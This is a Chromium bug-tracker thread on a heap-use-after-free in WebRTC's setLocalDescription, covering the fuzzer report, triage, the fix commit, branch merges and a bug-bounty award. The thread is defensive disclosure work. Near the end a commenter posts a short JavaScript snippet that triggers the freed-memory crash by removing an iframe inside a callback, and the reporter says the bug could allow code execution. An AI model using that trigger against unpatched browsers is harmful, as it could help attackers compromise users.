Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==1==ABORTING

**CREDIT INFORMATION**  

Reporter credit: banananapenguin

## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### cl...@chromium.org (2019-09-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5175722973724672.

### cl...@chromium.org (2019-09-19)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>WebRTC]

### cl...@chromium.org (2019-09-19)

Detailed Report: https://clusterfuzz.com/testcase?key=5175722973724672

Fuzzer: 
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x61600003b800
Crash State:
  base::internal::WeakReference::IsValid
  content::RTCPeerConnectionHandler::SetLocalDescription
  blink::RTCPeerConnection::setLocalDescription
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=441524:442831

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5175722973724672

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5175722973724672 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### sh...@chromium.org (2019-09-19)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-09-19)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ba...@gmail.com (2019-09-19)

Please note that call of peer_connection_tracker_->TrackSessionDescriptionCallback() (Point 3) is virtual function call. This vulnerability will lead to remote code execution(control flow hijacking).

### rs...@chromium.org (2019-09-19)

[Empty comment from Monorail migration]

### va...@chromium.org (2019-10-01)

hbos@chromium.org -- any update on this high priority security issue? Thanks.

### va...@chromium.org (2019-10-01)

[Empty comment from Monorail migration]

### hb...@chromium.org (2019-10-01)

Sorry I've been travelling and being busy, I'll take a look today.

### hb...@chromium.org (2019-10-01)

Thanks bananapenguin! Awesome bug description, the details are incredibly valuable.
I'm looking into this now and it looks similar to other issues I've seen and fixed, I'll create a patch.

### hb...@chromium.org (2019-10-01)

The same bug was possible for both setLocalDescription and setRemoteDescription. Fix for both in review: https://chromium-review.googlesource.com/c/chromium/src/+/1832277

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-10-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0cd560eea3e00305765c2a9da7ec959ccb757460

commit 0cd560eea3e00305765c2a9da7ec959ccb757460
Author: Henrik Boström <hbos@chromium.org>
Date: Tue Oct 01 22:34:31 2019

Fix heap-use-after-free in setLocalDescription/setRemoteDescription.

This is another case where the pc handler invokes JavaScript callbacks
which could cause the PC+handler to be deleted. The fix is to invoke the
callback as the last step before returning.

Bug: 1005251
Change-Id: I9a06ed0a6885b2f6d46e6646c2df0a9d07e79a2d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1832277
Reviewed-by: Guido Urdaneta <guidou@chromium.org>
Commit-Queue: Henrik Boström <hbos@chromium.org>
Cr-Commit-Position: refs/heads/master@{#701778}

[modify] https://crrev.com/0cd560eea3e00305765c2a9da7ec959ccb757460/content/renderer/media/webrtc/rtc_peer_connection_handler.cc


### hb...@chromium.org (2019-10-02)

Fixed and Verified, the CL landed for M79.

### sh...@chromium.org (2019-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-02)

Requesting merge to stable M77 because latest trunk commit (701778) appears to be after stable branch point (681094).

Requesting merge to beta M78 because latest trunk commit (701778) appears to be after beta branch point (693954).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sr...@google.com (2019-10-02)

merge approved for M78, branch:3904  please complete your merge before noon PST today so we can include this change in beta release tomorrow.

### go...@chromium.org (2019-10-03)

Please merge your change to M78 branch 3904 ASAP. Thank you.

### hb...@chromium.org (2019-10-03)

Done: https://chromium-review.googlesource.com/c/chromium/src/+/1836506

### go...@chromium.org (2019-10-04)

Please merge your change M78 branch 3904 ASAP so we can pick it up for next beta release. Thank you.

### hb...@chromium.org (2019-10-04)

I believe I did: https://bugs.chromium.org/p/chromium/issues/detail?id=1005251#c19

### gu...@chromium.org (2019-10-04)

[Empty comment from Monorail migration]

### gu...@chromium.org (2019-10-04)

Removing the Merge-Approved label, the Merge-Merged label is already there.
Something went wrong with this merge, where this bug believes it was never merged and https://crbug.com/chromium/1010855 believes it was merged without authorization.

### hb...@chromium.org (2019-10-04)

And https://chromiumdash.appspot.com/commit/0cd560eea3e00305765c2a9da7ec959ccb757460 still says first release is M79, but that would probably be expected until the next Beta cut.

Can we check if the CL made it into thee Beta branch?

### ad...@google.com (2019-10-04)

Re-adding Merge-Request-77 which fell off in the shenanigans above. As this is a High bug, we'd normally merge it to any M77 respin (subject to enough confidence in the fix).

### gu...@chromium.org (2019-10-04)

To answer hbos@: Yes, this made it to 78. See https://chromium.googlesource.com/chromium/src/+log/refs/tags/78.0.3904.46

### la...@google.com (2019-10-04)

merge approved for M77 branch 3865. Please merge your changes today for M77 re-spin targeted for 10/07.

### gu...@chromium.org (2019-10-04)

I just landed the merge to M77 here: https://chromium-review.googlesource.com/c/chromium/src/+/1841952

### hb...@chromium.org (2019-10-07)

[Empty comment from Monorail migration]

### na...@google.com (2019-10-07)

[Empty comment from Monorail migration]

### ad...@google.com (2019-10-07)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-10-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-08)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-10-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-10-09)

Congrats! The Panel decided to reward $7,500 for this report :) 

### na...@google.com (2019-10-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-11)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### hb...@chromium.org (2019-10-14)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-12-03)

hbos@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### hb...@chromium.org (2019-12-05)

#40: Done.

### mm...@chromium.org (2019-12-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-06-29)

It's exploit cost seems to be very expensive.

        iframe = document.createElement( "iframe");
        iframe.height = 50;
        iframe.width = 50;
        document.body.appendChild( iframe );
      
        pc = new iframe.contentWindow.RTCPeerConnection();
        
        pc.setLocalDescription( 
          { type : "offer", sdp : "v0"},
          _=> { },
          _=> { 
            iframe.remove();
          }
        );

### is...@google.com (2020-06-29)

This issue was migrated from crbug.com/chromium/1005251?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050154)*
